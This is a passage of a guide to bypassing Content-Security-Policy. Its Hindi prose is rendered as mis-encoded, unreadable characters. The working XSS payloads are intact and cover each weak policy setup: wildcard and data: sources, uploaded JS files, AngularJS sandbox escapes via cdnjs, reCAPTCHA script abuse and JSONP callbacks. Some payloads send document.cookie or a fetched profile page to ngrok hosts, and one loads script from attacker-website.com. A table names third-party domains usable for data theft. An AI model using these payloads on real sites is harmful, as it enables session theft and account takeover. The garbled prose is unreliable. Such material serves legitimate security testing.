рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рдПрдХ **рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд JS рдХреЛрдб рдиреЗ рдЕрдкрдиреЗ JS рдХреЛрдб рдХреЗ рд╕рд╛рде DOM рдореЗрдВ рдПрдХ рдирдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЯреИрдЧ рдмрдирд╛рдпрд╛** рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрд╕реЗ рдмрдирд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ **рдирдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЯреИрдЧ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреА**ред

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
рдХрд╛рд░реНрдпрд░рдд рдкреЗрд▓реЛрдб:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### рдСрдмреНрдЬреЗрдХреНрдЯ-рдПрд╕рдЖрд░рд╕реА рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ-рдПрд╕рдЖрд░рд╕реА рдХреА рдХрдореА

{% hint style="danger" %}
**рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
рдХрд╛рд░реНрдпрд░рдд рдкреЗрд▓реЛрдб:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб + 'self'

рдпрд╣ рддрдХрдиреАрдХ рдПрдХ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ Content Security Policy (CSP) рдХреЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИред рдЬрдм рдПрдХ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ CSP рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдФрд░ рдХреМрди рд╕реЗ рдирд╣реАрдВред рдпрджрд┐ CSP рдореЗрдВ 'self' рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреЗрд╡рд▓ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрдВрддрд░реНрдЧрдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╣реА рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдлрд╝реАрд▓реНрдб рдореЗрдВ рдЕрдкрдиреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрдВрддрд░реНрдЧрдд рд╕рдВрд╕рд╛рдзрди рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдлрд╝реАрд▓реНрдб рдореЗрдВ рдЕрдкрдиреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЙрд╕рдХрд╛ URL рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдлрд┐рд░ рд╣рдо рдЙрд╕ URL рдХреЛ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рдВрд╕рд╛рдзрди рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ, рд╣рдо CSP рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдХреЗ рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдкрдиреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдпрд╣ рддрдХрдиреАрдХ рдХреЗрд╡рд▓ рдЙрди рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдкрд░ рдХрд╛рдо рдХрд░реЗрдЧреА рдЬрд╣рд╛рдВ CSP рдореЗрдВ 'self' рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
рдпрджрд┐ рдЖрдк рдПрдХ JS рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕ CSP рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдкреЗрд▓реЛрдб:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
рдлрд┐рд░ рднреА, рдпрд╣ рдмрд╣реБрдд рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ **рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░ рд░рд╣рд╛ рд╣реИ** рдФрд░ рдХреЗрд╡рд▓ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдкреНрд░рдХрд╛рд░ рдХреА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╣реА рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рджреЗрдЧрд╛ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдк рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡реАрдХрд╛рд░реНрдп рдПрдХреНрд╕рдЯреЗрдВрд╢рди (рдЬреИрд╕реЗ: _script.png_) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ рдХреЗ рднреАрддрд░ **рдЬреЗрдПрд╕ рдХреЛрдб рдЕрдкрд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдХрд╛рдлреА рдирд╣реАрдВ рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рд╕рд░реНрд╡рд░ рдЬреИрд╕реЗ рдЕрдкрд╛рдЪреЗ рд╕рд░реНрд╡рд░ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдлрд╝рд╛рдЗрд▓ рдХреЗ MIME рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЪрдпрди** рдХрд░рддреЗ рд╣реИрдВ рдФрд░ Chrome рдЬреИрд╕реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЬреЗрдПрд╕ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╕реЗ **рдЗрдирдХрд╛рд░ рдХрд░реЗрдВрдЧреЗ** рдЬреЛ рдХрд┐ рдПрдХ рдЫрд╡рд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред "рдЖрд╢рд╛ рд╣реИ", рдпрд╣рд╛рдВ рдЧрд▓рддрд┐рдпрд╛рдБ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ CTF рд╕реЗ рдореИрдВрдиреЗ рд╕реАрдЦрд╛ рд╣реИ рдХрд┐ **рдЕрдкрд╛рдЪреЗ рдирд╣реАрдВ рдЬрд╛рдирддрд╛** рд╣реИ _**.wave**_ рдПрдХреНрд╕рдЯреЗрдВрд╢рди, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдПрдХ **рдСрдбрд┐рдпреЛ/\*** рдЬреИрд╕реЗ MIME рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕рд╛рде рд╕реЗрд╡ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред

рдпрд╣рд╛рдВ рд╕реЗ, рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ XSS рдФрд░ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдорд┐рд▓рддрд╛ рд╣реИ, рдФрд░ рдЖрдкрдХреЛ рдПрдХ **рдЧрд▓рдд рдЕрдиреБрд╡рд╛рджрд┐рдд рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдПрдХ рдлрд╝рд╛рдЗрд▓ рдФрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╛ рдпрджрд┐ рд╕рд░реНрд╡рд░ рдиреЗ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╣реА рдкреНрд░рд╛рд░реВрдк рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдПрдХ рдкреЙрд▓реАрдЧреНрд▓реЙрдЯ рдмрдирд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ ([рдпрд╣рд╛рдВ рдХреБрдЫ рдкреЙрд▓реАрдЧреНрд▓реЙрдЯ рдЙрджрд╛рд╣рд░рдг](https://github.com/Polydet/polyglot-database))ред

### рдерд░реНрдб рдкрд╛рд░реНрдЯреА рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ + ('unsafe-eval')

{% hint style="warning" %}
рдХреБрдЫ рдЗрд╕рдХреЗ рд▓рд┐рдП рдкреЗрд▓реЛрдб рдХреЗ рд▓рд┐рдП **`unsafe-eval` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ**ред
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
рдПрдХ рд╡рдВрд╢рд╡рд╛рджреА рд╕рдВрд╕реНрдХрд░рдг рд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рд╡рд┐рдЪрд╛рд░рд╢реАрд▓ JS рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдВ:
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Angular + рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреЗрд▓реЛрдб ([рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рджреЗрдЦреЗрдВ](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЖрдк рд╕рднреА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ `cdn.cloudflare.com` (рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд JS рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рд░реЗрдкреЛ) рд╕реЗ **рд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдкреНрд░рддреНрдпреЗрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╕реЗ рдЬреЛрдбрд╝реА рдЧрдИ рд╕рднреА рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ **рдХреМрди рд╕реЗ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЗ рдХреМрди рд╕реЗ рдлрд╝рдВрдХреНрд╢рди `window` рдСрдмреНрдЬреЗрдХреНрдЯ рд▓реМрдЯрд╛рддреЗ рд╣реИрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>



```
#### Google recaptcha JS рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛

[**рдЗрд╕ CTF рд╡реНрд░рд╛рдЗрдЯрдЕрдк**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=hi&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЖрдк [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ CSP рдХреЗ рдЕрдВрджрд░ рдЕрдирд┐рдпрдорд┐рдд JS рдХреЛрдб рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯ + JSONP

рдПрдХ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ Content Security Policy (CSP) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ рд╕реНрдерд╛рдкрд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдпрд╣ рдиреАрддрд┐ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдмрддрд╛рддреА рд╣реИ рдХрд┐ рдХреМрди рд╕реЗ рдбреЛрдореЗрдиреНрд╕ рдкрд░ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред

рдЗрд╕рдХреЗ рдмрд╛рд╡рдЬреВрдж, рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдПрдХ рдмрд╛рдд рд╣реИ - JSONP (JSON with Padding)ред JSONP рдПрдХ рддрд░рд╣ рдХрд╛ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрддрд┐ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЕрдиреНрдп рдбреЛрдореЗрдиреНрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдПрдХ CSP рдмрд╛рдЗрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо рдПрдХ `<script>` рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░ рдПрдХ JSONP рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ рдФрд░ рдЗрд╕реЗ рдЕрдкрдиреА рдиреАрддрд┐ рдХреЗ рдмрд╛рд╣рд░ рдЬрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЕрдкрдиреА рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрдмрдХрд┐ CSP рдиреАрддрд┐ рдХреЛ рдкреВрд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рддрдХрдиреАрдХ рдХреЗрд╡рд▓ рддрдм рдХрд╛рдо рдХрд░реЗрдЧреА рдЬрдм рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ JSONP рд╕рдорд░реНрдерд┐рдд рдХрд░рддреЗ рд╣реЛрдВ рдФрд░ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ CSP рдиреАрддрд┐ рд╕рдХреНрд╖рдо рд╣реЛред
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
рдЗрд╕ рддрд░рд╣ рдХреА рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ `script-src` рдХреЛ `self` рдФрд░ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдбреЛрдореЗрди рдЬрд┐рд╕реЗ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, JSONP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред JSONP рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдХреЙрд▓рдмреИрдХ рдореЗрдердбреНрд╕ рдХреЛ рд╕рдВрднрд╡рддрдГ рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ XSS рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдХрд╛рд░реНрдпрдХреНрд╖рдо рдкреЗрд▓реЛрдб:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЗ рд╕реАрдПрд╕рдкреА рдмрд╛рдЗрдкрд╛рд╕ рдХреЗ рд▓рд┐рдП рддрддреНрдкрд░ JSONP рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред**

рдпрджрд┐ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдПрдВрдбрдкреЙрдЗрдВрдЯ рдореЗрдВ рдПрдХ рдЦреБрд▓рд╛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди** рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣реА рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛ рдХреА рдХрдореА рд╣реЛрдЧреА рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдкреНрд░рд╛рдердорд┐рдХ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рднреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╣реЛрддреЗ рд╣реИрдВред

### рддреГрддреАрдп рдкрдХреНрд╖ рдХреЗ рджреБрд░реБрдкрдпреЛрдЧ
[рдЗрд╕ рдкреЛрд╕реНрдЯ](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses) рдореЗрдВ рд╡рд░реНрдгрд┐рдд рдХрд┐рдП рдЧрдП рддреГрддреАрдп рдкрдХреНрд╖ рдбреЛрдореЗрдиреЛрдВ рдореЗрдВ рдХрдИ рдРрд╕реЗ рдбреЛрдореЗрди рд╣реИрдВ, рдЬреЛ рдХрд╣реАрдВ-рди-рдХрд╣реАрдВ рд╕реАрдПрд╕рдкреА рдореЗрдВ рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ, рдЬрд┐рдирдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдбреЗрдЯрд╛ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдпрд╛ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдХреБрдЫ рддреГрддреАрдп рдкрдХреНрд╖ рдбреЛрдореЗрдиреЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

| рд╕рдВрдЧрдарди | рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдбреЛрдореЗрди | рдХреНрд╖рдорддрд╛рдПрдБ |
|--------|----------------|--------------|
| рдлреЗрд╕рдмреБрдХ | www.facebook.com, *.facebook.com | рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛ |
| рд╣реЙрдЯрдЬрд╛рд░ | *.hotjar.com, ask.hotjar.io | рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛ |
| рдЬреЗрдПрд╕рдбреЗрд▓реАрд╡рд░ | *.jsdelivr.com, cdn.jsdelivr.net | рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ |
| рдЕрдореЗрдЬрд╝рди рдХреНрд▓рд╛рдЙрдбрдлреНрд░рдВрдЯ | *.cloudfront.net | рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛, рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ |
| рдЕрдореЗрдЬрд╝рди рдПрдбрдмреНрд▓реНрдпреВрдПрд╕ | *.amazonaws.com | рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛, рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ |
